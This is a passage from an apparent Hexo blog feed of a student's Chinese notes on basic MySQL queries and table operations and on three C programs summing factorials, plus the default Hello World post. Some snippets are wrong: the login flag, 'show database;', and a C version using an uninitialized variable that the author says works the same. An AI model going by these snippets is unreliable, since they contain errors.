in(b,c);</code></p><p>查询不是a&#x3D;b及a&#x3D;c的数据。</p><h3 id="E-模糊查询-及"><a href="#E-模糊查询-及" class="headerlink" title="E. 模糊查询( % 及 _ )"></a>E. 模糊查询( % 及 _ )</h3><h4 id="匹配多个字符-以下先代码后解释"><a href="#匹配多个字符-以下先代码后解释" class="headerlink" title="% 匹配多个字符(以下先代码后解释)"></a>% 匹配多个字符(以下先代码后解释)</h4><p><code>select name from name(表名) where name1 like &#39;%o%&#39;;</code></p><p>找到名字里含有%o%的</p><p><code>select name from name(表名) where name1 like &#39;o%&#39;;</code></p><p>找到名字里以o开头的</p><p>&#96;select name from name(表名) where name1 like ‘%o’;&#96;&#96;</p><p>找到名字里以o结尾的</p><h4 id="匹配单个字符-以下先代码后解释"><a href="#匹配单个字符-以下先代码后解释" class="headerlink" title="_ 匹配单个字符(以下先代码后解释)"></a>_ 匹配单个字符(以下先代码后解释)</h4><p><code>select * from name(表名) where name1 like &#39;_A%&#39;;</code></p><p>找到第二个字母是A的</p><p>如果前面有n个字符，便在A前面输入n个下划线</p><h4 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h4><p><code>select * from name(表名) where name1 like &#39;% \ _%&#39;;</code></p><p>真实输入中%与\与_之间没有空格，本处为了显示 \ 故做特殊处理</p><p>% 和 \ 有特殊含义，为了正常显示下划线，采用转义方法，该处与C语言类似</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;mysql查询细节补录&quot;&gt;&lt;a href=&quot;#mysql查询细节补录&quot; class=&quot;headerlink&quot; title=&quot;mysql查询细节补录&quot;&gt;&lt;/a&gt;mysql查询细节补录&lt;/h1&gt;&lt;h2 id=&quot;1-引列并起别名的两种方法&quot;&gt;&lt;a href=&quot;#1-引列</summary>
      
    
    
    
    <category term="MySQL" scheme="http://example.com/categories/MySQL/"/>
    
    
    <category term="别名带空格或中文，模糊查询" scheme="http://example.com/tags/%E5%88%AB%E5%90%8D%E5%B8%A6%E7%A9%BA%E6%A0%BC%E6%88%96%E4%B8%AD%E6%96%87%EF%BC%8C%E6%A8%A1%E7%B3%8A%E6%9F%A5%E8%AF%A2/"/>
    
  </entry>
  
  <entry>
    <title>mysql数据库及数据表操作1.0</title>
    <link href="http://example.com/2023/10/17/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%8A%E6%95%B0%E6%8D%AE%E8%A1%A8%E6%93%8D%E4%BD%9C1-0/"/>
    <id>http://example.com/2023/10/17/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%8A%E6%95%B0%E6%8D%AE%E8%A1%A8%E6%93%8D%E4%BD%9C1-0/</id>
    <published>2023-10-17T08:34:17.000Z</published>
    <updated>2023-10-24T14:50:00.859Z</updated>
    
    <content type="html"><![CDATA[<h1 id="mysql数据库及数据表操作"><a href="#mysql数据库及数据表操作" class="headerlink" title="mysql数据库及数据表操作"></a>mysql数据库及数据表操作</h1><h2 id="1-登入"><a href="#1-登入" class="headerlink" title="1.登入"></a>1.登入</h2><p><code>win+r  =&gt;  cmd  =&gt;  mysql -u root -r  =&gt; 回车</code></p><h2 id="2-查询数据库及数据表"><a href="#2-查询数据库及数据表" class="headerlink" title="2.查询数据库及数据表"></a>2.查询数据库及数据表</h2><h3 id="a-查询所有数据库"><a href="#a-查询所有数据库" class="headerlink" title="a.查询所有数据库"></a>a.查询所有数据库</h3><h4 id="show-database"><a href="#show-database" class="headerlink" title="show database;"></a><code>show database;</code></h4><h3 id="b-查询当前数据库"><a href="#b-查询当前数据库" class="headerlink" title="b.查询当前数据库"></a>b.查询当前数据库</h3><h4 id="select-database"><a href="#select-database" class="headerlink" title="select database();"></a>select database();</h4><h3 id="c-查询当前数据库的所有表"><a href="#c-查询当前数据库的所有表" class="headerlink" title="c.查询当前数据库的所有表"></a>c.查询当前数据库的所有表</h3><h4 id="show-tables"><a href="#show-tables" class="headerlink" title="show tables;"></a><code>show tables;</code></h4><p>d.查看一个表的结构</p><h4 id="desc-name-表名"><a href="#desc-name-表名" class="headerlink" title="desc name(表名)"></a><code>desc name(表名)</code></h4><h2 id="3-创建数据库和数据表"><a href="#3-创建数据库和数据表" class="headerlink" title="3.创建数据库和数据表"></a>3.创建数据库和数据表</h2><h3 id="a-创建数据库"><a href="#a-创建数据库" class="headerlink" title="a.创建数据库"></a>a.创建数据库</h3><p><code>create database name（库名）</code></p><h3 id="b-创建数据表"><a href="#b-创建数据表" class="headerlink" title="b.创建数据表"></a>b.创建数据表</h3><p><code>create  table name (</code></p><p>列名1  数据类型1,</p><p>….</p><p>列名n  数据类型n,</p><p>);</p><p>mysql&gt; SHOW CREATE TABLE students;<br>+———-+——————————————————-+<br>| students | CREATE TABLE <code>students</code> (                             |<br>|          |   <code>id</code> bigint(20) NOT NULL AUTO_INCREMENT,            |<br>|          |   <code>class_id</code> bigint(20) NOT NULL,                     |<br>|          |   <code>name</code> varchar(100) NOT NULL,                       |<br>|          |   <code>gender</code> varchar(1) NOT NULL,                       |<br>|          |   <code>score</code> int(11) NOT NULL,                           |<br>|          |   PRIMARY KEY (<code>id</code>)                                  |<br>|          | ) ENGINE&#x3D;InnoDB AUTO_INCREMENT&#x3D;1 DEFAULT CHARSET&#x3D;utf8 |<br>+———-+——————————————————-+</p><p>上图表明了怎么写表；</p><h2 id="4-使用数据库"><a href="#4-使用数据库" class="headerlink" title="4.使用数据库"></a>4.使用数据库</h2><h3 id="use-name-库名"><a href="#use-name-库名" class="headerlink" title="use name(库名);"></a>use name(库名);</h3><h2 id="5-修改数据表-代码上，作用下"><a href="#5-修改数据表-代码上，作用下" class="headerlink" title="5.修改数据表(代码上，作用下 )"></a>5.修改数据表(代码上，作用下 )</h2><h4 id="提醒-无特殊说明时，name即是表名"><a href="#提醒-无特殊说明时，name即是表名" class="headerlink" title="提醒(无特殊说明时，name即是表名)"></a>提醒(无特殊说明时，name即是表名)</h4><p>   <code>alter table name rename to newname;</code></p><h3 id="改表名"><a href="#改表名" class="headerlink" title="(改表名)"></a>(改表名)</h3><p>a<code>lter table name character set 字符集名称;</code>  </p><h3 id="修改表的字符集"><a href="#修改表的字符集" class="headerlink" title="(修改表的字符集)"></a>(修改表的字符集)</h3><p><code>alter table name add name(列名) 数据类型;</code>   </p><h3 id="添加一列"><a href="#添加一列" class="headerlink" title="(添加一列)"></a>(添加一列)</h3><p><code>alter table name change name(列名) newname(新列别) 新数据类型;</code>   </p><h3 id="修改列名称-类型1"><a href="#修改列名称-类型1" class="headerlink" title="(修改列名称 类型1)"></a>(修改列名称 类型1)</h3><p><code>alter table name modify name(列名) 新数据类型;</code> </p><h3 id="修改列名称-类型2"><a href="#修改列名称-类型2" class="headerlink" title="(修改列名称 类型2)"></a>(修改列名称 类型2)</h3><p><code>alter table name drop name(列名)</code></p><h3 id="删除列"><a href="#删除列" class="headerlink" title="(删除列)"></a>(删除列)</h3><h2 id="6-删除数据库及数据表"><a href="#6-删除数据库及数据表" class="headerlink" title="6.删除数据库及数据表"></a>6.删除数据库及数据表</h2><h3 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h3><p><code>drop database if exists name(库名);</code></p><h3 id="删除数据表"><a href="#删除数据表" class="headerlink" title="删除数据表"></a>删除数据表</h3><p><code>drop table if exists name(表名);</code></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;mysql数据库及数据表操作&quot;&gt;&lt;a href=&quot;#mysql数据库及数据表操作&quot; class=&quot;headerlink&quot; title=&quot;mysql数据库及数据表操作&quot;&gt;&lt;/a&gt;mysql数据库及数据表操作&lt;/h1&gt;&lt;h2 id=&quot;1-登入&quot;&gt;&lt;a href=&quot;#1</summary>
      
    
    
    
    <category term="MySQL" scheme="http://example.com/categories/MySQL/"/>
    
    
    <category term="对象数据库及数据表，不是数据本身" scheme="http://example.com/tags/%E5%AF%B9%E8%B1%A1%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%8A%E6%95%B0%E6%8D%AE%E8%A1%A8%EF%BC%8C%E4%B8%8D%E6%98%AF%E6%95%B0%E6%8D%AE%E6%9C%AC%E8%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>C语言感想.1</title>
    <link href="http://example.com/2023/10/11/C%E8%AF%AD%E8%A8%80%E6%84%9F%E6%83%B3-1/"/>
    <id>http://example.com/2023/10/11/C%E8%AF%AD%E8%A8%80%E6%84%9F%E6%83%B3-1/</id>
    <published>2023-10-10T23:30:57.000Z</published>
    <updated>2023-10-11T04:54:47.704Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言感想-1"><a href="#C语言感想-1" class="headerlink" title="C语言感想.1"></a>C语言感想.1</h1><h2 id="一-看下面三个代码"><a href="#一-看下面三个代码" class="headerlink" title="一.看下面三个代码"></a>一.看下面三个代码</h2><ol><li></li></ol><p><code>#include &lt;stdio.h&gt;</code></p><p><code>int Me( int i)</code><br><code>&#123;</code><br>    <code>int a = 0;</code><br>    <code>int ret = 1;</code><br>    <code>for(a=1;a&lt;=i;a++)</code><br>    <code>&#123;</code><br>        <code>ret = a * ret;</code><br>    <code>&#125;</code><br>    <code>return ret;</code><br><code>&#125;</code></p><h6 id="int-main"><a href="#int-main" class="headerlink" title="int main()"></a><code>int main()</code></h6><h3 id=""><a href="#" class="headerlink" title="{"></a><code>&#123;</code></h3><h6 id="int-x-sum-n"><a href="#int-x-sum-n" class="headerlink" title="int x, sum, n;"></a><code>int x, sum, n;</code></h6><p>​<code>sum = 0;</code><br>​<code>scanf(&quot;%d&quot;,&amp;n);</code><br>​<code>for(x=1; x&lt;=n; x++)</code><br>​<code>&#123;</code><br>​<code>sum = sum + Me(x);</code><br>​<code>&#125;</code><br>​<code>printf(&quot;%d\n&quot;,sum);</code><br>​<code>return 0;</code><br><code>&#125;</code></p><ol start="2"><li></li></ol><p><code>#include &lt;stdio.h&gt;</code></p><h6 id="int-main-1"><a href="#int-main-1" class="headerlink" title="int main()"></a><code>int main()</code></h6><p><code>&#123;</code><br>    <code>int a, n, ret, i;</code><br>    <code>int sum = 0;</code><br>    <code>scanf(&quot;%d&quot;,&amp;n);</code><br>    <code>for(a=1; a&lt;=n; a++)</code><br>    <code>&#123;</code><br>        <code>ret = 1;</code><br>        <code>for(i=1; i&lt;=a; i++)</code><br>        <code>&#123;</code><br>            <code>ret = ret * i;</code><br>        <code>&#125;</code><br>        <code>sum = sum + ret;</code><br>    <code>&#125;</code><br>       <code>printf(&quot;%d&quot;,sum);</code><br>    <code>return 0;</code><br> <code>&#125;</code> </p><ol start="3"><li></li></ol><p><code>#include &lt;stdio.h&gt;</code></p><p><code>int main()</code><br><code>&#123;</code><br>    <code>int a, n, ret, i;</code><br>    <code>int sum = 0;</code><br>    <code>scanf(&quot;%d&quot;,&amp;n);</code><br>    <code>for(a=1; a&lt;=n; a++)</code><br>    <code>&#123;</code><br>        <code>ret = ret * a;</code><br>        <code>sum = ret + sum;</code><br>    <code>&#125;</code><br>       <code>printf(&quot;%d&quot;,sum);</code><br>    <code>return 0;</code><br> <code>&#125;</code> </p><p>二.感想：</p><p>​            同样的效果，代码不同。如何用最方便，最简单，最合适的代码编写程序是我今后努力的方向。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;C语言感想-1&quot;&gt;&lt;a href=&quot;#C语言感想-1&quot; class=&quot;headerlink&quot; title=&quot;C语言感想.1&quot;&gt;&lt;/a&gt;C语言感想.1&lt;/h1&gt;&lt;h2 id=&quot;一-看下面三个代码&quot;&gt;&lt;a href=&quot;#一-看下面三个代码&quot; class=&quot;header</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SQL笔记2.0修改</title>
    <link href="http://example.com/2023/10/10/SQL%E7%AC%94%E8%AE%B02-0%E4%BF%AE%E6%94%B9/"/>
    <id>http://example.com/2023/10/10/SQL%E7%AC%94%E8%AE%B02-0%E4%BF%AE%E6%94%B9/</id>
    <published>2023-10-10T08:29:50.000Z</published>
    <updated>2023-10-24T14:48:56.161Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL笔记2-0修改"><a href="#SQL笔记2-0修改" class="headerlink" title="SQL笔记2.0修改"></a>SQL笔记2.0修改</h1><h2 id="一-INSERT（添加数据）"><a href="#一-INSERT（添加数据）" class="headerlink" title="一.INSERT（添加数据）"></a>一.INSERT（添加数据）</h2><p>INSERT语法：</p><h3 id="INSERT-INTO-字段1-字段2-VALUES-值1-值2"><a href="#INSERT-INTO-字段1-字段2-VALUES-值1-值2" class="headerlink" title="INSERT INTO &lt;表名&gt; (字段1, 字段2, ...) VALUES (值1, 值2, ...);"></a><code>INSERT INTO &lt;表名&gt; (字段1, 字段2, ...) VALUES (值1, 值2, ...);</code></h3><p>1.eg：</p><p><code>INSERT INTO students (class_id, name, gender, score) VALUES (2, &#39;大牛&#39;, &#39;M&#39;, 80);</code></p><p><code>SELECT * FROM students;</code></p><table><thead><tr><th align="left">id</th><th align="left">class_id</th><th align="left">name</th><th align="left">gender</th><th align="left">score</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">1</td><td align="left">小明</td><td align="left">M</td><td align="left">90</td></tr><tr><td align="left">2</td><td align="left">1</td><td align="left">小红</td><td align="left">F</td><td align="left">95</td></tr><tr><td align="left">3</td><td align="left">1</td><td align="left">小军</td><td align="left">M</td><td align="left">88</td></tr><tr><td align="left">4</td><td align="left">1</td><td align="left">小米</td><td align="left">F</td><td align="left">73</td></tr><tr><td align="left">5</td><td align="left">2</td><td align="left">小白</td><td align="left">F</td><td align="left">81</td></tr><tr><td align="left">6</td><td align="left">2</td><td align="left">小兵</td><td align="left">M</td><td align="left">55</td></tr><tr><td align="left">7</td><td align="left">2</td><td align="left">小林</td><td align="left">M</td><td align="left">85</td></tr><tr><td align="left">8</td><td align="left">3</td><td align="left">小新</td><td align="left">F</td><td align="left">91</td></tr><tr><td align="left">9</td><td align="left">3</td><td align="left">小王</td><td align="left">M</td><td align="left">89</td></tr><tr><td align="left">10</td><td align="left">3</td><td align="left">小丽</td><td align="left">F</td><td align="left">88</td></tr><tr><td align="left">11</td><td align="left">1</td><td align="left">大宝</td><td align="left">M</td><td align="left">87</td></tr><tr><td align="left">12</td><td align="left">2</td><td align="left">二宝</td><td align="left">M</td><td align="left">81</td></tr><tr><td align="left">13</td><td align="left">2</td><td align="left">大牛</td><td align="left">M</td><td align="left">80</td></tr></tbody></table><p>解读：1. 我们没有列出 id ，因为id是自主增键，其可自动生成；</p><p>​           2.字段顺序不必和数据库表的字段顺序一致，但值的顺序必须和字段顺序一致；</p><h4 id="3-巧记：INSERT-INTO-VALUE"><a href="#3-巧记：INSERT-INTO-VALUE" class="headerlink" title="3.巧记：INSERT  INTO   VALUE;"></a>3.巧记：INSERT  INTO   VALUE;</h4><p>2.eg：</p><p>INSERT INTO students (class_id, name, gender, score) VALUES<br>  (1, ‘大宝’, ‘M’, 87),<br>  (2, ‘二宝’, ‘M’, 81);</p><p>SELECT * FROM students;</p><p>解读：加入多个数据，无需多言。</p><h2 id="二-UPDATE（更新数据）"><a href="#二-UPDATE（更新数据）" class="headerlink" title="二.UPDATE（更新数据）"></a>二.UPDATE（更新数据）</h2><p>UPDATE语法：</p><h3 id="UPDATE-SET-字段1-值1-字段2-值2-WHERE"><a href="#UPDATE-SET-字段1-值1-字段2-值2-WHERE" class="headerlink" title="UPDATE &lt;表名&gt; SET 字段1=值1, 字段2=值2, ... WHERE ...;"></a><code>UPDATE &lt;表名&gt; SET 字段1=值1, 字段2=值2, ... WHERE ...;</code></h3><p>1.egs：</p><p><code>UPDATE students SET name=&#39;大牛&#39;， score=66 WHERE id=1;</code></p><p>解读：</p><ol><li><h6 id="WHERE后面有很大的操作空间，不做赘叙，如：id-5-AND-id"><a href="#WHERE后面有很大的操作空间，不做赘叙，如：id-5-AND-id" class="headerlink" title="WHERE后面有很大的操作空间，不做赘叙，如：id&gt;&#x3D;5   AND   id&lt;&#x3D; 7UPDATE"></a>WHERE后面有很大的操作空间，不做赘叙，如：id&gt;&#x3D;5   AND   id&lt;&#x3D; 7UPDATE</h6></li></ol><h4 id="2-巧记：UPDATE-SET-WHERE"><a href="#2-巧记：UPDATE-SET-WHERE" class="headerlink" title="2.巧记：UPDATE  SET   WHERE;"></a>2.巧记：UPDATE  SET   WHERE;</h4><h2 id="三-DELETE-删除数据"><a href="#三-DELETE-删除数据" class="headerlink" title="三.DELETE(删除数据)"></a>三.DELETE(删除数据)</h2><p>DELETE语法：</p><h3 id="DELETE-FROM-WHERE"><a href="#DELETE-FROM-WHERE" class="headerlink" title="DELETE FROM &lt;表名&gt; WHERE ...;"></a><code>DELETE FROM &lt;表名&gt; WHERE ...;</code></h3><p>1.eg:</p><p>​          <code>DELETE FROM students WHERE id&gt;=5 AND id&lt;=7;</code><br>​           <code>-- 查询并观察结果:</code><br>​          <code>SELECT * FROM students;</code></p><p>解读：1.WHERE：本语法的核心就在于 WHERE , 其有很大的操作空间，如 UPDATE。</p><h4 id="2-巧记：DELETE-FROM-WHERE"><a href="#2-巧记：DELETE-FROM-WHERE" class="headerlink" title="2.巧记：DELETE  FROM   WHERE;"></a>2.巧记：DELETE  FROM   WHERE;</h4><p>总结：难度不大。</p><p>​          </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SQL笔记2-0修改&quot;&gt;&lt;a href=&quot;#SQL笔记2-0修改&quot; class=&quot;headerlink&quot; title=&quot;SQL笔记2.0修改&quot;&gt;&lt;/a&gt;SQL笔记2.0修改&lt;/h1&gt;&lt;h2 id=&quot;一-INSERT（添加数据）&quot;&gt;&lt;a href=&quot;#一-INSER</summary>
      
    
    
    
    <category term="MySQL" scheme="http://example.com/categories/MySQL/"/>
    
    
    <category term="概述" scheme="http://example.com/tags/%E6%A6%82%E8%BF%B0/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2023/10/05/hello-world/"/>
    <id>http://example.com/2023/10/05/hello-world/</id>
    <published>2023-10-05T06:26:44.237Z</published>
    <updated>2023-10-05T06:26:44.237Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
